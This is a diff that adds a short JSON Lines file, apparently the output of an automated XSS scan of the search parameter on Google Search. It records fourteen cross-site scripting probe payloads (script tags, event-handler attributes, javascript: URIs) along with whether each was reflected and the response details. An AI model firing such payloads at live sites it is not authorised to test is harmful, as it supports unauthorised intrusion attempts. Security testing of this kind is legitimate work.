@@ -1,0 +1,14 @@
+{"url": "https://www.google.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", "param": "q", "payload": "<script>alert(1)</script>", "reflected": false, "status": 200, "length": 91090}
+{"url": "https://www.google.com/search?q=%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E", "param": "q", "payload": "'\"><script>alert(1)</script>", "reflected": false, "status": 200, "length": 91815}
+{"url": "https://www.google.com/search?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E", "param": "q", "payload": "<img src=x onerror=alert(1)>", "reflected": false, "status": 200, "length": 90958}
+{"url": "https://www.google.com/search?q=%3Csvg+onload%3Dalert%281%29%3E", "param": "q", "payload": "<svg onload=alert(1)>", "reflected": false, "status": 200, "length": 91096}
+{"url": "https://www.google.com/search?q=javascript%3Aalert%281%29", "param": "q", "payload": "javascript:alert(1)", "reflected": true, "status": 200, "length": 90776}
+{"url": "https://www.google.com/search?q=%3Cbody+onload%3Dalert%281%29%3E", "param": "q", "payload": "<body onload=alert(1)>", "reflected": false, "status": 200, "length": 90840}
+{"url": "https://www.google.com/search?q=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E", "param": "q", "payload": "<input onfocus=alert(1) autofocus>", "reflected": false, "status": 200, "length": 92599}
+{"url": "https://www.google.com/search?q=%3Cselect+onfocus%3Dalert%281%29+autofocus%3E", "param": "q", "payload": "<select onfocus=alert(1) autofocus>", "reflected": false, "status": 200, "length": 90966}
+{"url": "https://www.google.com/search?q=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E", "param": "q", "payload": "<textarea onfocus=alert(1) autofocus>", "reflected": false, "status": 200, "length": 91109}
+{"url": "https://www.google.com/search?q=%3Cmarquee+onstart%3Dalert%281%29%3E", "param": "q", "payload": "<marquee onstart=alert(1)>", "reflected": false, "status": 200, "length": 91154}
+{"url": "https://www.google.com/search?q=%3Cdiv+style%3D%22background%3Aurl%28javascript%3Aalert%281%29%29%22%3E", "param": "q", "payload": "<div style=\"background:url(javascript:alert(1))\">", "reflected": false, "status": 200, "length": 90830}
+{"url": "https://www.google.com/search?q=%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E", "param": "q", "payload": "<iframe src=\"javascript:alert(1)\">", "reflected": false, "status": 200, "length": 90986}
+{"url": "https://www.google.com/search?q=%3Cdetails+open+ontoggle%3Dalert%281%29%3E", "param": "q", "payload": "<details open ontoggle=alert(1)>", "reflected": false, "status": 200, "length": 90883}
+{"url": "https://www.google.com/search?q=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E", "param": "q", "payload": "<a href=\"javascript:alert(1)\">click</a>", "reflected": false, "status": 200, "length": 91085}
